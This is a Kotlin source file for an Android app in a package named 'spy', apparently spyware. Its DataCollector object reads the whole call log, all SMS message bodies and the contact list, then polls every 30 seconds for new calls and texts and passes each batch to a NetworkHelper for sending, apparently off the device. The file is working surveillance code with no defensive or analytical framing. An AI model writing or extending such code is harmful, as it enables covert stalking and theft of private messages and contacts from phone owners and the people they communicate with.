package com.gauravhanna.spy

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object DataCollector {
    private const val TAG = "DataCollector"
    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var lastCallTimestamp = 0L
    private var lastSmsTimestamp = 0L
    private var initialRunDone = false

    fun start(context: Context) {
        Log.d(TAG, "DataCollector start() called")
        if (!initialRunDone) {
            collectAllCalls(context)
            collectAllSms(context)
            collectAllContacts(context)
            initialRunDone = true
        }
        executor.scheduleAtFixedRate({
            collectNewCalls(context)
            collectNewSms(context)
        }, 0, 30, TimeUnit.SECONDS)
    }

    // Helper to safely get column indices
    private fun getColumnIndexOrThrow(cursor: Cursor, columnName: String): Int {
        val idx = cursor.getColumnIndex(columnName)
        if (idx == -1) throw IllegalArgumentException("Column $columnName not found")
        return idx
    }

    // ---------- All existing call logs ----------
    private fun collectAllCalls(context: Context) {
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            "${CallLog.Calls.DATE} ASC"
        ) ?: return
        try {
            val numberIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.NUMBER)
            val nameIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.CACHED_NAME)
            val typeIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.TYPE)
            val durationIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DURATION)
            val dateIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DATE)

            val calls = mutableListOf<CallLogEntry>()
            while (cursor.moveToNext()) {
                val number = cursor.getString(numberIdx) ?: ""
                val name = cursor.getString(nameIdx)
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    else -> "missed"
                }
                val duration = cursor.getInt(durationIdx)
                val date = cursor.getLong(dateIdx)
                calls.add(CallLogEntry(number, name, type, duration, date))
                if (date > lastCallTimestamp) lastCallTimestamp = date
            }
            if (calls.isNotEmpty()) {
                Log.d(TAG, "Sending ${calls.size} existing call logs")
                NetworkHelper.sendCalls(context, calls)
            } else {
                Log.d(TAG, "No existing call logs")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting all calls: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    // ---------- All existing SMS ----------
    private fun collectAllSms(context: Context) {
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            "${Telephony.Sms.DATE} ASC"
        ) ?: return
        try {
            val addressIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.ADDRESS)
            val bodyIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.BODY)
            val dateIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.DATE)

            val smsList = mutableListOf<SmsEntry>()
            while (cursor.moveToNext()) {
                val address = cursor.getString(addressIdx) ?: ""
                val body = cursor.getString(bodyIdx) ?: ""
                val date = cursor.getLong(dateIdx)
                smsList.add(SmsEntry(address, body, date))
                if (date > lastSmsTimestamp) lastSmsTimestamp = date
            }
            if (smsList.isNotEmpty()) {
                Log.d(TAG, "Sending ${smsList.size} existing SMS")
                NetworkHelper.sendSMS(context, smsList)
            } else {
                Log.d(TAG, "No existing SMS")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting all SMS: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    // ---------- All contacts ----------
    private fun collectAllContacts(context: Context) {
        val cursor = context.contentResolver.query(
            android.provider.ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null,
            null
        ) ?: return
        try {
            val idIdx = getColumnIndexOrThrow(cursor, android.provider.ContactsContract.Contacts._ID)
            val nameIdx = getColumnIndexOrThrow(cursor, android.provider.ContactsContract.Contacts.DISPLAY_NAME)
            val contacts = mutableListOf<ContactEntry>()
            while (cursor.moveToNext()) {
                val id = cursor.getString(idIdx)
                val name = cursor.getString(nameIdx) ?: ""
                var number = ""
                val phoneCursor = context.contentResolver.query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    "${android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                    arrayOf(id),
                    null
                )
                phoneCursor?.use {
                    if (it.moveToFirst()) {
                        val numberIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                        if (numberIdx != -1) {
                            number = it.getString(numberIdx) ?: ""
                        }
                    }
                }
                contacts.add(ContactEntry(name, number))
            }
            if (contacts.isNotEmpty()) {
                Log.d(TAG, "Sending ${contacts.size} contacts")
                NetworkHelper.sendContacts(context, contacts)
            } else {
                Log.d(TAG, "No contacts")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting contacts: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    // ---------- New calls (after last timestamp) ----------
    private fun collectNewCalls(context: Context) {
        val selection = "${CallLog.Calls.DATE} > ?"
        val selectionArgs = arrayOf(lastCallTimestamp.toString())
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            "${CallLog.Calls.DATE} ASC"
        ) ?: return
        try {
            val numberIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.NUMBER)
            val nameIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.CACHED_NAME)
            val typeIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.TYPE)
            val durationIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DURATION)
            val dateIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DATE)

            val calls = mutableListOf<CallLogEntry>()
            while (cursor.moveToNext()) {
                val number = cursor.getString(numberIdx) ?: ""
                val name = cursor.getString(nameIdx)
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    else -> "missed"
                }
                val duration = cursor.getInt(durationIdx)
                val date = cursor.getLong(dateIdx)
                calls.add(CallLogEntry(number, name, type, duration, date))
                if (date > lastCallTimestamp) lastCallTimestamp = date
            }
            if (calls.isNotEmpty()) {
                Log.d(TAG, "Sending ${calls.size} new call logs")
                NetworkHelper.sendCalls(context, calls)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting new calls: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    // ---------- New SMS (after last timestamp) ----------
    private fun collectNewSms(context: Context) {
        val selection = "${Telephony.Sms.DATE} > ?"
        val selectionArgs = arrayOf(lastSmsTimestamp.toString())
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            "${Telephony.Sms.DATE} ASC"
        ) ?: return
        try {
            val addressIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.ADDRESS)
            val bodyIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.BODY)
            val dateIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.DATE)

            val smsList = mutableListOf<SmsEntry>()
            while (cursor.moveToNext()) {
                val address = cursor.getString(addressIdx) ?: ""
                val body = cursor.getString(bodyIdx) ?: ""
                val date = cursor.getLong(dateIdx)
                smsList.add(SmsEntry(address, body, date))
                if (date > lastSmsTimestamp) lastSmsTimestamp = date
            }
            if (smsList.isNotEmpty()) {
                Log.d(TAG, "Sending ${smsList.size} new SMS")
                NetworkHelper.sendSMS(context, smsList)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting new SMS: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    data class CallLogEntry(val number: String, val name: String?, val type: String, val duration: Int, val date: Long)
    data class SmsEntry(val address: String, val body: String, val date: Long)
    data class ContactEntry(val name: String, val number: String)
}